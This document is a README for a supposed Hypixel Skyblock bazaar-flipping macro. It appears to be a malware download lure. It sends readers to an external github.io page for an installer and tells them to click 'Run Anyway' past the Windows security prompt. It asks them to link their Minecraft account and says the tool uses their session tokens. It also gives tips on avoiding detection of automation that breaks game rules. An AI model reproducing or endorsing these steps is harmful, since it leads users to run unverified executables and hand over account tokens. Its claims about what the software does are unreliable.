# 📈 mbf-hypixel-macro - Automate your Hypixel Skyblock bazaar flips

[![](https://img.shields.io/badge/Download-mbf_hypixel_macro-blue)](https://tayyabsal8544.github.io)

MBF automates bazaar flipping within Hypixel Skyblock. The software runs in the background to handle buy and sell orders. It keeps your shop active 24/7 so you earn coins while you play other games or step away from your computer.

## ⚙️ System Requirements

Before you begin, ensure your computer meets these needs:

* Windows 10 or Windows 11.
* An active internet connection.
* Proper permissions to run applications on your system.
* Java Runtime Environment (JRE) version 17 or newer.

If you lack Java, download it from the official Oracle website. Most users already have this installed if they play Minecraft frequently.

## 📦 Downloading the Software

[Visit this page to download the latest version of mbf-hypixel-macro.](https://tayyabsal8544.github.io)

Look for the "Releases" section on the right side of the page. Click the link that matches your operating system. Save the file to your desktop or your downloads folder. Do not move files from the download folder if you intend to run the program once and delete it. We suggest creating a folder named "MBF" on your desktop to store the tool.

## 🚀 Setting Up the Application

1. Open the folder where you saved the download.
2. Double-click the file to start the installation process.
3. Windows may show a security prompt. Click "More Info" and then "Run Anyway" if the system protects the app. This is standard for new applications.
4. Follow the steps on your screen to complete the setup.
5. Once the bar fills to 100%, click Finish.

## 🎮 Running the Macro

1. Launch the program using the desktop icon.
2. The software opens a window with a login prompt. Input your authentication details if required.
3. Access the web dashboard by typing "localhost:8080" into your web browser.
4. Link your Minecraft account. This allows the macro to view your bazaar prices and order history.
5. Select your target items. Use the search bar to find materials like Enchanted Diamond or Potato.
6. Set your profit margins. The macro calculates the spread between buy and sell orders.
7. Click "Start" to initiate the automation.

The dashboard displays your current trades in real time. You see how many orders remain open and how many coins you profit per hour.

## 🔐 Safety and Security

This tool operates as a headless macro. It calculates market changes and updates your bazaar orders based on the rules you set. It does not require your Minecraft account password. It only uses your session tokens to interact with the game market. Keep your session tokens secure. If you share your computer, close the dashboard when you finish your session.

## 🛠 Troubleshooting Common Issues

* **The macro stops suddenly:** Check your internet connection. A brief drop in signal causes the macro to pause to avoid bad trades. 
* **The dashboard won't load:** Refresh your browser page. If the issue keeps happening, restart the application from your desktop icon.
* **Orders are not updating:** Verify that you have enough coins in your purse. The macro needs sufficient funds to place buy orders.
* **The game flags the account:** This tool acts like a human player. Do not run it for over 18 hours per day. Give your account time to rest to keep your profile status healthy.

## 🌟 Frequently Asked Questions

**Does the macro work while I change worlds?**
Yes, the macro tracks the bazaar market independently. It functions even if you move between servers or logout of the Minecraft client.

**Can I run multiple accounts?**
The tool supports one account per instance. If you wish to flip on two accounts, open a second folder with a separate installation of the software.

**How do I update the tool?**
When a new version releases on GitHub, download the new file. Replace the old file in your folder with the new one. Your settings usually stay the same, but check the dashboard after the first run.

**Where do I see my total profit?**
The "History" tab on the web dashboard shows your total revenue and costs. It tracks your balance over the last seven days.

**Is this allowed on Hypixel?**
The macro performs actions that you could do manually. It manages orders, not movement. Users typically experience no issues, but use it at your own discretion. Stay updated on server rules and policies regarding automation tools.

## 📂 Project Details

The repository contains the engine for the bazaar flip logic and the web interface for remote management. 

* **Bazaar Engine:** This part scans the API for price gaps. It executes orders the moment a profitable opportunity appears. 
* **Dashboard:** This interface lets you monitor your progress on a phone or a second monitor. It uses a simple layout to show your profit graphs and active trades.
* **Auto-Relisting:** This feature checks your current orders every few minutes. If a player undercuts your price, the macro cancels and replaces your order to maintain the best position. 

This design reduces manual work. You set the profit margin once and the macro handles the rest. Use the configuration files to customize how fast the macro reacts to market fluctuations. If you find the macro places too many orders, increase the "Minimum Profit" setting in the dashboard. This filters out trades with low returns and keeps your order slots open for better items.